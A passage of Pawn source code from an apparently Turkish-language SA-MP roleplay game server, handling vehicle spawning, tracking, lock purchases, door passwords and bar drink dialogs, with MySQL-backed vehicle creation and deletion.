					if(arr_Towing[i] == PlayerVehicleInfo[playerid][listitem][pvId] && arr_Towing[i] != INVALID_VEHICLE_ID)
					    x++;
				}

				if(x != 0)
				    return SendClientMessage(playerid, COLOR_GREY, "Aracýn çekiliyorken bu komutu kullanamazsýn.");

				// The rest of the code...
				--PlayerCars;
				VehicleSpawned[playerid]--;
				PlayerVehicleInfo[playerid][listitem][pvSpawned] = 0;
				DestroyVehicle(PlayerVehicleInfo[playerid][listitem][pvId]);
				VehicleRadioStation[PlayerVehicleInfo[playerid][listitem][pvId]] = 0;
				PlayerVehicleInfo[playerid][listitem][pvId] = INVALID_PLAYER_VEHICLE_ID;

				new vstring[128];
				format(vstring, sizeof(vstring), "%s model aracýný sakladýn. Aracýn artýk gözükmüyor.", VehicleName[PlayerVehicleInfo[playerid][listitem][pvModelId] - 400]);
				SendClientMessage(playerid, COLOR_WHITE, vstring);
			}
		}
		else if(PlayerVehicleInfo[playerid][listitem][pvModelId] == 0) {
			SendClientMessage(playerid, COLOR_WHITE, "Olmayan bir aracý çýkaramazsýn.");
		}
		else if(PlayerVehicleInfo[playerid][listitem][pvImpounded]) {
			SendClientMessage(playerid, COLOR_WHITE, "Baðlanmýþ bir aracý çýkaramazsýn. Tekrar çýkarmak için DMV'ye git.");
		}
		else if(PlayerVehicleInfo[playerid][listitem][pvDisabled] == 1) {
			SendClientMessage(playerid, COLOR_WHITE, "Kullanýlamaz halde olan bir aracý VIP levelin dolayýsýyla çýkaramazsýn. (araç kýsýtlamalarý).");
		}
		else if(PlayerVehicleInfo[playerid][listitem][pvSpawned] == 0) {
			if(PlayerInfo[playerid][pDonator] == 0 && VehicleSpawned[playerid] > 0) {
				SendClientMessage(playerid, COLOR_GREY, "VIP olmadan ayný anda yalnýzca 1 araç çýkarabilirsin. Baþka çýkarmak için diðerini sakla.");
			}
			else if(PlayerInfo[playerid][pDonator] == 1 && VehicleSpawned[playerid] > 1) {
				SendClientMessage(playerid, COLOR_GREY, "Yakut VIP'e sahip olduðundan dolayý ayný anda 2 araç çýkarabilirsin.");
			}
			else if(PlayerInfo[playerid][pDonator] == 2 && VehicleSpawned[playerid] > 2) {
				SendClientMessage(playerid, COLOR_GREY, "Safir VIP'e sahip olduðundan dolayý ayný anda 3 araç çýkarabilirsin.");
			}
			else if(PlayerInfo[playerid][pDonator] == 3 && VehicleSpawned[playerid] > 3) {
				SendClientMessage(playerid, COLOR_GREY, "Elmas VIP'e sahip olduðundan dolayý ayný anda 4 araç çýkarabilirsin.");
			}
			/*else if(PlayerInfo[playerid][pDonator] == 4 && VehicleSpawned[playerid] >= 5) {
				SendClientMessage(playerid, COLOR_GREY, "As Undefined Donator you can only have 5 vehicles spawned. You must store a vehicle in order to spawn another one.");
			}
			else if(PlayerInfo[playerid][pDonator] == 5 && VehicleSpawned[playerid] >= 5){
				SendClientMessage(playerid, COLOR_GREY, "As VIP Moderator you can only have 5 vehicles spawned. You must store a vehicle in order to spawn another one.");
			}*/
			else if(!(0 <= PlayerInfo[playerid][pDonator] <= 3)) {
				SendClientMessage(playerid, COLOR_GREY, "Geçersiz VIP leveline sahipsin.");
			}
			else {
				++PlayerCars;
				VehicleSpawned[playerid]++;
				PlayerVehicleInfo[playerid][listitem][pvSpawned] = 1;
				PlayerVehicleInfo[playerid][listitem][pvId] = CreateVehicle(PlayerVehicleInfo[playerid][listitem][pvModelId], PlayerVehicleInfo[playerid][listitem][pvPosX], PlayerVehicleInfo[playerid][listitem][pvPosY], PlayerVehicleInfo[playerid][listitem][pvPosZ], PlayerVehicleInfo[playerid][listitem][pvPosAngle],PlayerVehicleInfo[playerid][listitem][pvColor1], PlayerVehicleInfo[playerid][listitem][pvColor2], -1);
				//VehicleFuel[PlayerVehicleInfo[playerid][listitem][pvId]] = PlayerVehicleInfo[playerid][listitem][pvFuel];
				if(PlayerVehicleInfo[playerid][listitem][pvLocked] == 1) LockPlayerVehicle(playerid, PlayerVehicleInfo[playerid][listitem][pvId], PlayerVehicleInfo[playerid][listitem][pvLock]);

				if(strlen(PlayerVehicleInfo[playerid][listitem][pvNumberPlate]) > 0)
					SetVehicleNumberPlate(PlayerVehicleInfo[playerid][listitem][pvId], PlayerVehicleInfo[playerid][listitem][pvNumberPlate]);

				LoadPlayerVehicleMods(playerid, listitem);

				new vstring[128];
				format(vstring, sizeof(vstring), "%s model aracýný çýkarttýn. Aracýn þu anda en son park ettiðin yerde.", VehicleName[PlayerVehicleInfo[playerid][listitem][pvModelId] - 400]);
				SendClientMessage(playerid, COLOR_WHITE, vstring);
			}
		}
		else SendClientMessage(playerid, COLOR_WHITE, "Bulunmayan bir aracý çýkaramazsýn.");
	}
	if(dialogid == TRACKCAR && response) {
		new Float: carPos[3];
		if(PlayerVehicleInfo[playerid][listitem][pvId] > INVALID_PLAYER_VEHICLE_ID)
		{
			GetVehiclePos(PlayerVehicleInfo[playerid][listitem][pvId], carPos[0], carPos[1], carPos[2]);
			if(CheckPointCheck(playerid))
			{
				SendClientMessage(playerid, COLOR_WHITE, "Haritanda baþka bir kýrmýzý nokta var ise /hedefsifirla yazarak sýfýrladýðýna emin ol. (ya materyal pakedin var, yada baþka bir kýrýmýzý nokta).");
			}
			else
			{
				SetPVarInt(playerid, "TrackCar", 1);

				new zone[MAX_ZONE_NAME];
				Get3DZone(carPos[0], carPos[1], carPos[2], zone, sizeof(zone));
				format(string, sizeof(string), "Aracýnýn olduðu yer: %s.", zone);
				SendClientMessage(playerid, COLOR_YELLOW, string);
				SetPlayerCheckpoint(playerid, carPos[0], carPos[1], carPos[2], 15.0);
				SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Aracýný bulmak için haritadaki kýrmýzý noktaya git.");
			}
		}
		else if(PlayerVehicleInfo[playerid][listitem][pvImpounded]) SendClientMessage(playerid, COLOR_WHITE, "Baðlanmýþ bir aracýn yerini bulamazsýn. Tekrar çýkarmak için DMV'ye git.");
		else if(PlayerVehicleInfo[playerid][listitem][pvDisabled] == 1) SendClientMessage(playerid, COLOR_WHITE, "Kullanýlamaz hale gelmiþ aracýn yerini bulma özelliði VIP levelin yüzünden devredýþý. (araç kýsýtlamalarý).");
		else if(PlayerVehicleInfo[playerid][listitem][pvSpawned] == 0 && PlayerVehicleInfo[playerid][listitem][pvModelId] != 0) SendClientMessage(playerid, COLOR_WHITE, "Saklamýþ olduðun bir aracýn yerini bulamazsýn. /araclarim komutunu kullanarak aracýný çýkar.");
		else SendClientMessage(playerid, COLOR_WHITE, "Olmayan bir aracýn yerini bulamazsýn.");
	}
	else if(dialogid == GTRACKCAR)
	{
	    if(response == 1)
	    {
	        for(new i = 0; i < MAX_GANG_VEHICLES; i++)
	        {
	            if(listitem == i)
	            {
	                new Float: carPos[3];
					new Family = PlayerInfo[playerid][pGang];
					if(FamilyVehicleInfo[Family][i][fvId] != INVALID_VEHICLE_ID)
					{
	                	GetVehiclePos(FamilyVehicleInfo[Family][i][fvId], carPos[0], carPos[1], carPos[2]);
	                	if(CheckPointCheck(playerid))
						{
							SendClientMessage(playerid, COLOR_WHITE, "Haritanda baþka bir kýrmýzý nokta var ise /hedefsifirla yazarak sýfýrladýðýna emin ol. (ya materyal pakedin var, yada baþka bir kýrýmýzý nokta).");
						}
						else
						{
					    	SetPVarInt(playerid, "TrackCar", 1);

					    	new zone[MAX_ZONE_NAME];
					    	Get3DZone(carPos[0], carPos[1], carPos[2], zone, sizeof(zone));
					    	format(string, sizeof(string), "Aracýnýn olduðu yer: %s.", zone);
					    	SendClientMessage(playerid, COLOR_YELLOW, string);
					    	SetPlayerCheckpoint(playerid, carPos[0], carPos[1], carPos[2], 15.0);
					    	SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Aracýný bulmak için kýrmýzý noktaya git!");
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Boþ slotdaki bir aracýn yerini bulamazsýn.");
					}
	            }
	        }
	    }
	}
	if(dialogid == UNMODCARMENU)
	{
	    if(response)
	    {
		    new count = GetPVarInt(playerid, "modCount");
			new d;
			for(new z = 0 ; z < MAX_PLAYERVEHICLES; z++)
			{
				if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[playerid][z][pvId]))
				{
					d = z;
				    break;
				}
			}
            for (new i = 0; i < count; i++)
			{
				if(listitem == i)
				{
				    format(string, sizeof(string), "partList%i", i);
					new partID = GetPVarInt(playerid, string);
					if(partID == 999)
					{
					    for(new f = 0 ; f < MAX_MODS; f++)
						{
							SetPVarInt(playerid, "unMod", 1);
							RemoveVehicleComponent(PlayerVehicleInfo[playerid][d][pvId], GetVehicleComponentInSlot(PlayerVehicleInfo[playerid][d][pvId], f));
							PlayerVehicleInfo[playerid][d][pvMods][f] = 0;
						}
						SendClientMessage(playerid, COLOR_WHITE, "Aracýndaki tüm modifikasyonlar silindi.");
						return 1;
					}
					SetPVarInt(playerid, "unMod", 1);
     				RemoveVehicleComponent(GetPlayerVehicleID(playerid), partID);
     				PlayerVehicleInfo[playerid][d][pvMods][GetVehicleComponentType(partID)] = 0;
     				SendClientMessage(playerid, COLOR_WHITE, "Ýstediðin modifikasyon silindi.");
     				return 1;
				}
        	}
		}
	}
	else if(dialogid == DIALOG_CDLOCKBUY)
	{
		if(response)
		{
			if(listitem == 0)
			{
				if(GetPlayerVehicleCount(playerid) != 0)
				{
				    if(PlayerInfo[playerid][pCash] < 1000)
			        {
                        SendClientMessage(playerid, COLOR_GRAD2, " Yeterli paran yok!");
                        return 1;
					}
					SetPVarInt(playerid, "lockmenu", 1);
                    for(new i=0; i<MAX_PLAYERVEHICLES; i++)
	                {
					     if(PlayerVehicleInfo[playerid][i][pvId] != INVALID_PLAYER_VEHICLE_ID)
					     {
		                     format(string, sizeof(string), "Araç %d | Ýsim: %s.",i+1,GetVehicleName(PlayerVehicleInfo[playerid][i][pvId]));
		                     SendClientMessage(playerid, COLOR_WHITE, string);
					     }
				    }
				    ShowPlayerDialogEx(playerid, DIALOG_CDLOCKMENU, DIALOG_STYLE_INPUT, "24-7;", "Sistemi kuracaðýn bir araç seç:", "Seç", "Iptal");

				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Hiçbir aracýn yok, bu sistemi nerede kullanacaksýn?");
					return 1;
				}
			}
			if(listitem == 1)
			{
				if(GetPlayerVehicleCount(playerid) != 0)
				{
				    if(PlayerInfo[playerid][pCash] < 1500)
			        {
                        SendClientMessage(playerid, COLOR_GRAD2, " Yeterli paran yok!");
                        return 1;
					}
					SetPVarInt(playerid, "lockmenu", 2);
				    for(new i=0; i<MAX_PLAYERVEHICLES; i++)
	                {
					     if(PlayerVehicleInfo[playerid][i][pvId] != INVALID_PLAYER_VEHICLE_ID)
					     {
		                     format(string, sizeof(string), "Araç %d | Ýsim: %s.",i+1,GetVehicleName(PlayerVehicleInfo[playerid][i][pvId]));
		                     SendClientMessage(playerid, COLOR_WHITE, string);
					     }
				    }
				    ShowPlayerDialogEx(playerid, DIALOG_CDLOCKMENU, DIALOG_STYLE_INPUT, "24-7;", "Sistemi kuracaðýn bir araç seç:", "Seç", "Iptal");
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Hiçbir aracýn yok, bu sistemi nerede kullanacaksýn?");
					return 1;
				}
			}
		}
	}
	if(dialogid == DIALOG_CDLOCKMENU)
	{
		if(response) {
			if(GetPVarInt(playerid, "lockmenu") == 1) {
	            new pvid;
	            if(IsNumeric(inputtext)) {
					pvid = strval(inputtext)-1;
				    if(PlayerVehicleInfo[playerid][pvid][pvId] == INVALID_PLAYER_VEHICLE_ID)
				    {
					    SendClientMessage(playerid, COLOR_GRAD4, "Hata: Bu slotta herhangi bir aracýn yok.");
					    SetPVarInt(playerid, "lockmenu", 0);
					    return 1;
				    }
				    if(PlayerVehicleInfo[playerid][pvid][pvLock] == 1)
				    {
					    SendClientMessage(playerid, COLOR_GRAD4, "Hata: Bu araçta zaten bir kilit sistemi mevcut.");
					    SetPVarInt(playerid, "lockmenu", 0);
					    return 1;
				    }
				    new idx = GetPlayerVirtualWorld(playerid)-100;
					BizInfo[idx][bProducts] --;
                    BizInfo[idx][bSold] ++;
					BizInfo[idx][bMoney] += 1000;
				    format(string, sizeof(string), "Alarm Kilidi satýn aldýn.");
				    SendClientMessage(playerid, COLOR_GRAD4, string);
				    SendClientMessage(playerid, COLOR_YELLOW,"IPUCU: Aracýný kilitlemek için /kilit komutunu kullanabilirsin.");
				    PlayerInfo[playerid][pCash] -= 1000;
				    PlayerVehicleInfo[playerid][pvid][pvLock] = 1;
				    SetPVarInt(playerid, "lockmenu", 0);
			    }
			}
			else if(GetPVarInt(playerid, "lockmenu") == 2)
			{
			    new pvid;
	            if(IsNumeric(inputtext))
		        {
	                pvid = strval(inputtext)-1;
				    if(PlayerVehicleInfo[playerid][pvid][pvId] == INVALID_PLAYER_VEHICLE_ID)
				    {
					    SendClientMessage(playerid, COLOR_GRAD4, "Hata: Bu slotta herhangi bir aracýn yok.");
					    SetPVarInt(playerid, "lockmenu", 0);
		                return 1;
				    }
				    if(PlayerVehicleInfo[playerid][pvid][pvLock] == 2)
			  	    {
					    SendClientMessage(playerid, COLOR_GRAD4, "Hata: Bu araçta zaten bir kilit sistemi mevcut.");
					    SetPVarInt(playerid, "lockmenu", 0);
					    return 1;
				    }
				    format(string, sizeof(string), "Endüstriyel kilit satýn aldýn!");
				    SendClientMessage(playerid, COLOR_GRAD4, string);
				    new idx = GetPlayerVirtualWorld(playerid)-100;
					BizInfo[idx][bProducts] --;
                    BizInfo[idx][bSold] ++;
					BizInfo[idx][bMoney] += 1500;
				    SendClientMessage(playerid, COLOR_YELLOW,"IPUCU: Aracýný kilitlemek için /kilit komutunu kullanabilirsin.");
					PlayerInfo[playerid][pCash] -= 1500;
				    PlayerVehicleInfo[playerid][pvid][pvLock] = 2;
				    SetPVarInt(playerid, "lockmenu", 0);
			    }
			}
		}
	}
	else if(dialogid == DIALOG_CDGLOCKBUY)
	{
		if(response)
		{
			if(listitem == 0)
			{
				if(GetGangVehicleCount(PlayerInfo[playerid][pGang]) != 0)
				{
				    if(PlayerInfo[playerid][pCash] < 1000)
			        {
                        SendClientMessage(playerid, COLOR_GRAD2, " Yeterli paran yok!");
                        return 1;
					}
					SetPVarInt(playerid, "lockmenu", 1);
                    for(new i=0; i<MAX_GANG_VEHICLES; i++)
	                {
					     if(FamilyVehicleInfo[PlayerInfo[playerid][pGang]][i][fvId] != INVALID_VEHICLE_ID)
					     {
		                     format(string, sizeof(string), "Araç %d | Ýsim: %s.",i+1,GetVehicleName(FamilyVehicleInfo[PlayerInfo[playerid][pGang]][i][fvId]));
		                     SendClientMessage(playerid, COLOR_WHITE, string);
					     }
				    }
				    ShowPlayerDialogEx(playerid, DIALOG_CDGLOCKMENU, DIALOG_STYLE_INPUT, "24-7;", "Sistemi kuracaðýn bir araç seç:", "Seç", "Iptal");

				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Hiçbir aracýn yok, bu sistemi nerede kullanacaksýn?");
					return 1;
				}
			}
			if(listitem == 1)
			{
				if(GetGangVehicleCount(PlayerInfo[playerid][pGang]) != 0)
				{
				    if(PlayerInfo[playerid][pCash] < 5000)
           			{
                        SendClientMessage(playerid, COLOR_GRAD2, " Yeterli paran yok!");
                        return 1;
					}
					SetPVarInt(playerid, "lockmenu", 2);
				    for(new i=0; i<MAX_GANG_VEHICLES; i++)
	                {
					     if(FamilyVehicleInfo[PlayerInfo[playerid][pGang]][i][fvId] != INVALID_VEHICLE_ID)
					     {
		                     format(string, sizeof(string), "Araç %d | Ýsim: %s.",i+1,GetVehicleName(FamilyVehicleInfo[PlayerInfo[playerid][pGang]][i][fvId]));
		                     SendClientMessage(playerid, COLOR_WHITE, string);
					     }
				    }
				    ShowPlayerDialogEx(playerid, DIALOG_CDGLOCKMENU, DIALOG_STYLE_INPUT, "24-7;", "Sistemi kuracaðýn bir araç seç:", "Seç", "Iptal");
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Hiçbir aracýn yok, bu sistemi nerede kullanacaksýn?");
					return 1;
				}
			}
		}
	}
	if(dialogid == DIALOG_CDGLOCKMENU)
	{
		if(response)
		{
		if(GetPVarInt(playerid, "lockmenu") == 1)
		{
            new fvid;
            if(IsNumeric(inputtext))
	        {
				fvid = strval(inputtext)-1;
			    if(FamilyVehicleInfo[PlayerInfo[playerid][pGang]][fvid][fvId] == INVALID_VEHICLE_ID)
			    {
				    SendClientMessage(playerid, COLOR_GRAD4, "Hata: Bu slotta herhangi bir aracýn yok.");
				    SetPVarInt(playerid, "lockmenu", 0);
				    return 1;
			    }
			    if(FamilyVehicleInfo[PlayerInfo[playerid][pGang]][fvid][fvLock] == 1)
			    {
				    SendClientMessage(playerid, COLOR_GRAD4, "Hata: Bu araçta zaten bir kilit sistemi mevcut.");
				    SetPVarInt(playerid, "lockmenu", 0);
				    return 1;
			    }
			    format(string, sizeof(string), "Alarm Kilidi satýn aldýn.");
			    SendClientMessage(playerid, COLOR_GRAD4, string);
			    SendClientMessage(playerid, COLOR_YELLOW,"IPUCU: Artýk aile araçlarýnýn kilidini açmak için /gkilit komutunu kullanabilirsin.");
			    PlayerInfo[playerid][pCash] -= 1000;
			    FamilyVehicleInfo[PlayerInfo[playerid][pGang]][fvid][fvLock] = 1;
			    SetPVarInt(playerid, "lockmenu", 0);
		    }
		}
		else if(GetPVarInt(playerid, "lockmenu") == 2)
		{
		    new fvid;
            if(IsNumeric(inputtext))
	        {
                fvid = strval(inputtext)-1;
			    if(FamilyVehicleInfo[PlayerInfo[playerid][pGang]][fvid][fvId] == 0)
			    {
				    SendClientMessage(playerid, COLOR_GRAD4, "Hata: Bu slotta herhangi bir aracýn yok.");
				    SetPVarInt(playerid, "lockmenu", 0);
	                return 1;
			    }
			    if(FamilyVehicleInfo[PlayerInfo[playerid][pGang]][fvid][fvLock] == 2)
		  	    {
				    SendClientMessage(playerid, COLOR_GRAD4, "Hata: Bu araçta zaten bir kilit sistemi mevcut.");
				    SetPVarInt(playerid, "lockmenu", 0);
				    return 1;
			    }
			    format(string, sizeof(string), "Endüstriyel kilit satýn aldýn!");
			    SendClientMessage(playerid, COLOR_GRAD4, string);
			    SendClientMessage(playerid, COLOR_YELLOW,"IPUCU: Artýk aile araçlarýnýn kilidini açmak için /gkilit komutunu kullanabilirsin.");
			    PlayerInfo[playerid][pCash] -= 1500;
			    FamilyVehicleInfo[PlayerInfo[playerid][pGang]][fvid][fvLock] = 2;
			    SetPVarInt(playerid, "lockmenu", 0);
		    }
		}
		}
	}
	else if(dialogid == DOORLOCK)
	{
		if(response == 1)
		{
		    new i = GetPVarInt(playerid, "Door");
		    if(isnull(inputtext))
		    {
		        SendClientMessage(playerid, COLOR_GREY, "Herhangi birþey girmedin.");
		        return 1;
		    }
		    if(strlen(inputtext) > 24)
		    {
		        SendClientMessage(playerid, COLOR_GREY, "Þifre maksimum 24 karakter içerebilir.");
		        return 1;
		    }
		    if(strcmp(inputtext, DDoorsInfo[i][ddPass], true) == 0)
		    {
		        if(DDoorsInfo[i][ddLocked] == 0)
		        {
					DDoorsInfo[i][ddLocked] = 1;
					SendClientMessage(playerid, COLOR_WHITE, "Þifre kabul edildi, kapýlar kilitlendi.");
		        }
		        else
		        {
		            DDoorsInfo[i][ddLocked] = 0;
		            SendClientMessage(playerid, COLOR_WHITE, "Þifre kabul edildi, kapýlar açýldý.");
		        }
			}
			else
			{
			    SendClientMessage(playerid, COLOR_WHITE, "Þifre reddedildi.");
			}
		}
		else
		{
		    return 1;
		}
	}
	else if(dialogid == DRINKLISTDIALOG)
	{
	    if(response)
	    {
			switch(listitem)
			{
			    case 0:
			    {
			        SetPVarString(playerid, "DrinkName", "Bira");
			        SetPVarInt(playerid, "DrinkPrice", 60);
			        SetPVarInt(playerid, "DrinkSpecialAction", SPECIAL_ACTION_DRINK_BEER);
			    }
			    case 1:
			    {
			        SetPVarString(playerid, "DrinkName", "Vodka");
			        SetPVarInt(playerid, "DrinkPrice", 100);
			        SetPVarInt(playerid, "DrinkSpecialAction", SPECIAL_ACTION_DRINK_WINE);
			    }
			    case 2:
			    {
			        SetPVarString(playerid, "DrinkName", "Viski");
			        SetPVarInt(playerid, "DrinkPrice", 100);
			        SetPVarInt(playerid, "DrinkSpecialAction", SPECIAL_ACTION_DRINK_WINE);
			    }
			    case 3:
			    {
			        SetPVarString(playerid, "DrinkName", "Su");
			        SetPVarInt(playerid, "DrinkPrice", 20);
			        SetPVarInt(playerid, "DrinkSpecialAction", SPECIAL_ACTION_DRINK_SPRUNK);
			    }
			    case 4:
			    {
			        SetPVarString(playerid, "DrinkName", "Soda");
			        SetPVarInt(playerid, "DrinkPrice", 20);
			        SetPVarInt(playerid, "DrinkSpecialAction", SPECIAL_ACTION_DRINK_SPRUNK);
			    }
			}
			if(GetPlayerCash(playerid) >= GetPVarInt(playerid, "DrinkPrice"))
			{
			    new drinkname[32];
				GetPVarString(playerid, "DrinkName", drinkname, sizeof(drinkname));
			    new drinkprice = GetPVarInt(playerid, "DrinkPrice");
				new dspecialaction = GetPVarInt(playerid, "DrinkSpecialAction");
			    format(string, sizeof(string), "Barmenden $%d'a %s istedin. Barmene bahþiþ vermek ister misin?", drinkprice, drinkname);
			    ShowPlayerDialogEx(playerid, DRINKDIALOG, DIALOG_STYLE_MSGBOX, "Ýçki Satýnal", string, "evet", "hayir");
			    format(string, sizeof(string), "Barmen %s, %s adlý kiþiye bir %s hazirlar ve verir.", GetPlayerNameEx(DrinkOffer[playerid]), GetPlayerNameEx(playerid), drinkname);
				ProxDetector(15.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				format(string, sizeof(string), "%s adlý kiþiye %s verdin. Onlarda sana parayý uzattý. ($%d)", GetPlayerNameEx(playerid), drinkname, drinkprice);
				SendClientMessage(DrinkOffer[playerid], COLOR_LIGHTBLUE, string);
				GivePlayerCash(DrinkOffer[playerid], drinkprice);
				GivePlayerCash(playerid, -drinkprice);
				SetPlayerSpecialAction(playerid, dspecialaction);
				SetPVarInt(playerid, "DrinkCooledDown", 1);

				new ip[32], ipex[32];
				GetPlayerIp(playerid, ip, sizeof(ip));
				GetPlayerIp(DrinkOffer[playerid], ipex, sizeof(ipex));
				DrinkWarn[playerid][DrinkOffer[playerid]] += drinkprice;
				if(DrinkWarn[playerid][DrinkOffer[playerid]] >= 2500 && (PlayerInfo[DrinkOffer[playerid]][pLevel] <= 3 || PlayerInfo[DrinkOffer[playerid]][pLevel] <= 3))
				{
					format(string, sizeof(string), "%s (IP:%s), %s (IP:%s) adlý barmene $%d bahþiþ verdi.", GetPlayerNameEx(playerid), ip, GetPlayerNameEx(DrinkOffer[playerid]), ipex, DrinkWarn[playerid][DrinkOffer[playerid]]);
					ABroadCast(COLOR_YELLOW, string, 1);
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You don't have enough money for this drink!");
			}
	    }
	    else
	    {
	        DrinkOffer[playerid] = INVALID_PLAYER_ID;
	    }
	}
	else if(dialogid == DRINKDIALOG)
	{
	    if(response)
	    {
			ShowPlayerDialogEx(playerid, TIPDIALOG, DIALOG_STYLE_INPUT, "Barmene Bahþiþ Vermek", "Barmene servisinden dolayý ne kadarlýk bir  bahþiþ vermek istiyorsun?", "Tamam", "Iptal");
		}
		else
		{
		    DrinkOffer[playerid] = INVALID_PLAYER_ID;
		}
	}
	else if(dialogid == TIPDIALOG)
	{
	    if(response)
	    {
			if(GetPlayerCash(playerid) >= strval(inputtext))
			{
			    if(strval(inputtext) < 0 || strval(inputtext) > 1000)
			    {
			    	return ShowPlayerDialogEx(playerid, TIPDIALOG, DIALOG_STYLE_INPUT, "Barmene Bahþiþ Vermek", "Bahþiþiniz $0 ile $1000 arasý olmalýdýr.\nBarmene servisi için ne kadarlýk bir bahþiþ vermek istiyorsunuz?", "Tamam", "Iptal");
			    }
			    format(string, sizeof(string), "%s, %s adlý barmene servisinden dolayý bahþiþ verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(DrinkOffer[playerid]));
				ProxDetector(15.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				format(string, sizeof(string), "%s adlý kiþi sana servisinden dolayý $%d bahþiþ verdi.", GetPlayerNameEx(playerid), strval(inputtext));
				SendClientMessage(DrinkOffer[playerid], COLOR_LIGHTBLUE, string);
				GivePlayerCash(DrinkOffer[playerid], strval(inputtext));
				GivePlayerCash(playerid, -strval(inputtext));

				new ip[32], ipex[32];
				GetPlayerIp(playerid, ip, sizeof(ip));
				GetPlayerIp(DrinkOffer[playerid], ipex, sizeof(ipex));
				DrinkWarn[playerid][DrinkOffer[playerid]] += strval(inputtext);
				if(DrinkWarn[playerid][DrinkOffer[playerid]] >= 2500 && (PlayerInfo[DrinkOffer[playerid]][pLevel] <= 3 || PlayerInfo[playerid][pLevel] <= 3))
				{
					format(string, sizeof(string), "%s (IP:%s), %s (IP:%s) adlý barmene $%d bahþiþ verdi.", GetPlayerNameEx(playerid), ip, GetPlayerNameEx(DrinkOffer[playerid]), ipex, DrinkWarn[playerid][DrinkOffer[playerid]]);
					ABroadCast(COLOR_YELLOW, string, 1);
				}

				DrinkOffer[playerid] = INVALID_PLAYER_ID;
			}
		}
		else
		{
		    DrinkOffer[playerid] = INVALID_PLAYER_ID;
		}
	}
	return 1;
}

//------------------------------------------------------------------------------
//PLAYER OWNED VEHICLES SYSTEM
//------------------------------------------------------------------------------

LockPlayerVehicle(ownerid, carid, type)
{
	new v = GetPlayerVehicle(ownerid, carid);
	if(PlayerVehicleInfo[ownerid][v][pvId] == carid && type == 2)
	{
	    LockStatus[carid] = 1;
	    vehicle_lock_doors(carid);
	}
}

UnLockPlayerVehicle(ownerid, carid, type)
{
	new v = GetPlayerVehicle(ownerid, carid);
	if(PlayerVehicleInfo[ownerid][v][pvId] == carid && type == 2)
	{
	    LockStatus[carid] = 0;
		vehicle_unlock_doors(carid);
	}
}

forward DisableVehicleAlarm(vehicleid);
public DisableVehicleAlarm(vehicleid)
{
 	GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
    SetVehicleParamsEx(vehicleid,engine,lights,VEHICLE_PARAMS_OFF,doors,bonnet,boot,objective);
	return 1;
}

forward ReleasePlayer(playerid);
public ReleasePlayer(playerid)
{
	SetPVarInt(playerid, "IsFrozen", 0);
	TogglePlayerControllable(playerid,1);
}

stock CreatePlayerVehicle(playerid, playervehicleid, modelid, Float: x, Float: y, Float: z, Float: angle, color1, color2, price) {
	if(PlayerVehicleInfo[playerid][playervehicleid][pvId] == INVALID_PLAYER_VEHICLE_ID) {
 		VehicleSpawned[playerid]++;

	    PlayerCars++;

		PlayerVehicleInfo[playerid][playervehicleid][pvModelId] = modelid;
		PlayerVehicleInfo[playerid][playervehicleid][pvPosX] = x;
		PlayerVehicleInfo[playerid][playervehicleid][pvPosY] = y;
		PlayerVehicleInfo[playerid][playervehicleid][pvPosZ] = z;
		PlayerVehicleInfo[playerid][playervehicleid][pvPosAngle] = angle;
		PlayerVehicleInfo[playerid][playervehicleid][pvColor1] = color1;
		PlayerVehicleInfo[playerid][playervehicleid][pvColor2] = color2;
		PlayerVehicleInfo[playerid][playervehicleid][pvPark] = 1;
		PlayerVehicleInfo[playerid][playervehicleid][pvPrice] = price;
		PlayerVehicleInfo[playerid][playervehicleid][pvFuel] = 100.0;
		PlayerVehicleInfo[playerid][playervehicleid][pvImpounded] = 0;

		for(new m = 0; m < MAX_MODS; m++)
	    	PlayerVehicleInfo[playerid][playervehicleid][pvMods][m] = 0;

		new
			carcreated = CreateVehicle(modelid, x, y, z, angle, color1, color2, -1);

		LockStatus[carcreated] = 0;
		PlayerVehicleInfo[playerid][playervehicleid][pvId] = carcreated;
		PlayerVehicleInfo[playerid][playervehicleid][pvSpawned] = 1;
		SetVehicleNumberPlate(carcreated, PlayerVehicleInfo[playerid][playervehicleid][pvNumberPlate]);

		new
		    szQuery[300];
		format(szQuery, sizeof(szQuery), "INSERT INTO playervehicles (Owner, PosX, PosY, PosZ, PosAngle, ModelID, Color1, Color2, Price, Spawned) VALUES(%d, '%f', '%f', '%f', '%f', %d, %d, %d, %d, 1)", PlayerInfo[playerid][pID], x, y, z, angle, modelid, color1, color2, price);
		mysql_query(szQuery);
		PlayerVehicleInfo[playerid][playervehicleid][pvRealID] = mysql_insert_id();
		return carcreated;
	}
	return INVALID_PLAYER_VEHICLE_ID;
}

stock DestroyPlayerVehicle(playerid, playervehicleid) {
	if(PlayerVehicleInfo[playerid][playervehicleid][pvModelId]) {
	    new
	        szQuery[50];

		format(szQuery, sizeof(szQuery), "DELETE FROM playervehicles WHERE ID = %d", PlayerVehicleInfo[playerid][playervehicleid][pvRealID]);
		mysql_query(szQuery, THREAD_NO_RESULT, 0, g_MySQLConnections[0]);

	    VehicleSpawned[playerid]--;

	    PlayerCars--;

		DestroyVehicle(PlayerVehicleInfo[playerid][playervehicleid][pvId]);
		VehicleRadioStation[PlayerVehicleInfo[playerid][playervehicleid][pvId]] = 0;
		PlayerVehicleInfo[playerid][playervehicleid][pvModelId] = 0;
		PlayerVehicleInfo[playerid][playervehicleid][pvPosX] = 0.0;
		PlayerVehicleInfo[playerid][playervehicleid][pvPosY] = 0.0;
		PlayerVehicleInfo[playerid][playervehicleid][pvPosZ] = 0.0;
		PlayerVehicleInfo[playerid][playervehicleid][pvPosAngle] = 0.0;
		PlayerVehicleInfo[playerid][playervehicleid][pvPaintJob] = -1;
		PlayerVehicleInfo[playerid][playervehicleid][pvColor1] = 126;
